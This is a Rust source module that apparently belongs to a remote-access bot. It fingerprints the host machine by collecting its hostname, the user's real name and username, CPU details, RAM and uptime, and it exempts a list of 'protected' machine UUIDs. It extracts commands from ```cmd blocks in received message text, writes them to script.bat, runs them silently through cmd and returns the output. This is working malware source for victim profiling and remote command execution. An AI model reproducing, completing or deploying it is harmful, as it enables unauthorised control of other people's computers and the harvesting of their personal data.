extern crate machine_uuid;
extern crate sysinfo;
extern crate gethostname;
extern crate whoami;

use std::process::{Command, Output};
use self::sysinfo::{System, ProcessorExt, SystemExt};
use std::fs::File;
use std::io::prelude::*;
use std::{fs, cmp};
use crate::PROTECTED_UUIDS;
use random_number::random;

pub struct PcInfo {
    pub pc_name: String,
    pub user_nick: String,
    pub user_name: String,
    pub proc_name: String,
    pub proc_vendor_id: String,
    pub proc_brand: String,
    pub sys_ram: String,
    pub sys_time_up: String,
    pub sys_time_boot: String,
}

pub fn get_protected_uuid() -> Vec<String> {
    let mut protected_uuids: Vec<String> = Vec::new();
    for uuid in PROTECTED_UUIDS {
        protected_uuids.push(uuid.to_string())
    }

    protected_uuids
}

pub fn get_uuid() -> String {
    machine_uuid::get()
}

pub fn uuid_is_protected() -> bool {
    let uuid: String = get_uuid();
    let protected_uuids: Vec<String> = get_protected_uuid();
    for protected_uuid in protected_uuids {
        if uuid == protected_uuid {
            return true
        }
    }
    false
}

pub fn get_pc_info() -> PcInfo {
    let mut pc_inf = PcInfo{
        pc_name: "PROTECTED".to_string(),
        user_nick: "PROTECTED".to_string(),
        user_name: "PROTECTED".to_string(),
        proc_name: "PROTECTED".to_string(),
        proc_vendor_id: "PROTECTED".to_string(),
        proc_brand: "PROTECTED".to_string(),
        sys_ram: "PROTECTED".to_string(),
        sys_time_up: "PROTECTED".to_string(),
        sys_time_boot: "PROTECTED".to_string()
    };

    if !uuid_is_protected() {
        pc_inf.pc_name = gethostname::gethostname().into_string().unwrap();
        pc_inf.user_name = whoami::realname();
        pc_inf.user_nick = whoami::username();

        let system: System = System::new();
        for processor in system.get_processors() {
            pc_inf.proc_name = String::from(processor.get_name());
            pc_inf.proc_vendor_id = String::from(processor.get_vendor_id());
            pc_inf.proc_brand = String::from(processor.get_brand());
            break;
        }

        pc_inf.sys_ram = format!("{}", system.get_available_memory());
        pc_inf.sys_time_up = format!("{}", system.get_uptime() / 3600);
        pc_inf.sys_time_boot = format!("{}", system.get_boot_time() / 3600);
    }

    pc_inf
}

pub fn get_script_content(content: String) -> Result<String, ()> {
    let mut content: String = content;
    let prefix: usize;
    match content.find("```cmd\n") {
        None => return Err(()),
        Some(size) => prefix = size + 7usize
    }
    content = content.replace("```cmd\n", "---cmd\n");
    return match content.find("```") {
        None => Err(()),
        Some(size) => Ok(content[prefix..size].to_string())
    }
}

pub fn execute_script(script: String) -> Result<String, ()> {
    let mut file: File = File::create("script.bat").unwrap();
    file.write_all(script.as_bytes()).unwrap();

    let output: Output = Command::new("cmd")
        .args(&["/C", "script.bat"])
        .output()
        .expect("Unknown Error!");

    match fs::remove_file("script.bat") {
        Ok(_) => (),
        Err(_) => ()
    }

    Ok(format!("{}", String::from_utf8_lossy(&output.stdout)))
}

pub fn split_by_lengths(data: String, len: usize) -> Result<Vec<String>, ()> {
    let mut v: Vec<String> = vec![];
    let mut cur: &str = data.as_str();
    while !cur.is_empty() {
        let (chunk, rest) = cur.split_at(cmp::min(len, cur.len()));
        v.push(chunk.to_string());
        cur = rest;
    }

    Ok(v)
}

/* I definitely need to update this crap */
pub fn generate_sid() -> String {

    let mut sid = "sid.".to_string();

    let charset = split_by_lengths(
        "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890".to_string(),
        1
    ).unwrap();

    let mut i: u8;

    for _ in 0..6 {
        i = random!(..=(charset.len() - 1) as u8);
        sid += charset[i as usize].as_str();
    }

    sid += "-";

    for _ in 0..4 {
        i = random!(..=(charset.len() - 1) as u8);
        sid += charset[i as usize].as_str();
    }

    sid
}
